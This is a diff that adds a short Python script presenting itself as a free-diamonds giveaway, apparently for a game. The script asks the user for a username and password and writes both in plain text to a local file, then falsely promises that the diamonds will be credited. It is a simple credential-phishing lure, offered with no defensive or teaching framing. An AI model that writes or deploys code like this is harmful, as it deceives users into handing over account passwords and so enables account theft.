@@ -1,0 +1,8 @@
+print("enter you username to claim diamons!")
+a = input("enter username")
+b = input("enter password")
+f =open("foo.txt","w")
+f.write(a)
+f.write(b)
+f.close()
+print("the diamonds will be added to your id soon !!")
